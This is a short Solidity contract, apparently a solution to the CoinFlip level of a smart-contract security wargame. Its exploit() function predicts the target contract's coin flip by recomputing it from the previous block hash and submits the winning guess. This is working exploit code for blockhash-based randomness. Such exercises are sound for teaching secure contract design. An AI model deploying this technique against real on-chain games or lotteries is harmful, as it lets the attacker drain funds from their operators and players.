// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import '../CoinFlip.sol';

contract CoinFlipCheck {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public cf;

  constructor(address _flipAddress) public {
    consecutiveWins = 0;
    cf = CoinFlip(_flipAddress);
  }

  function myFlip() public returns (bool) {
    uint256 blockValue = uint256(blockhash((block.number).sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    return side;
  }

  function exploit() public {
      bool myside = myFlip();
      cf.flip(myside);
  }

}